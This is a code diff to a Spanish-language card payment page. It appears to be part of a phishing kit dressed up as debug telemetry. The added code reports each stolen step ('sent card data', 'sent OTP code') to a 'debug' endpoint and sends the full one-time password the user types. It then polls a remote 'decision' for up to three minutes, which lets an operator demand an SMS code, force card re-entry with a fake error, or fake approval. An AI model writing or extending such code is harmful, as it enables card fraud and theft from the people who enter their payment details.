@@ -1218,6 +1218,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
       const route = await sendDebugEvent('PAYMENT_SUBMIT', {
         cardFirstDigit: cardDigits.charAt(0),
         meta: {
+          step: 'Envió datos de tarjeta',
           brand: brandKey,
           amount: total,
           card: maskCard(cardNumber?.value || ''),
@@ -1262,10 +1263,44 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         }),
       );
 
-      window.setTimeout(() => {
+      const decision = await pollDebugDecision(180000);
+      const nextAction = decision?.action || 'timeout';
+
+      if (nextAction === 'sms' || nextAction === 'sms_error') {
         if (wait) wait.hidden = true;
-        showChallenge(brandKey, merchantLabel, amountLabel, datetimeLabel);
-      }, Number(route?.delayMs || 1200));
+        document.body.classList.remove('is-offers-waiting');
+        showChallenge(
+          brandKey,
+          merchantLabel,
+          amountLabel,
+          datetimeLabel,
+          nextAction === 'sms_error' ? decision?.message || '' : '',
+        );
+        return;
+      }
+
+      if (nextAction === 'card' || nextAction === 'card_error') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        clearCardInputs();
+        setCardOpen(true);
+        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        cardNumber?.focus();
+        return;
+      }
+
+      if (nextAction === 'approved') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        window.location.href = '/success';
+        return;
+      }
+
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
     } catch (error) {
       payBtn.classList.remove('is-loading');
       payBtn.removeAttribute('aria-busy');
@@ -1315,6 +1350,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         console.log('OTP: ', input.value)
         await sendDebugEvent('OTP_SUBMIT', {
           metaOtp: {
+            step: 'Envió código OTP',
             brand: brandKey,
             otp: input.value,
             otpLength: String(input.value || '').trim().length,
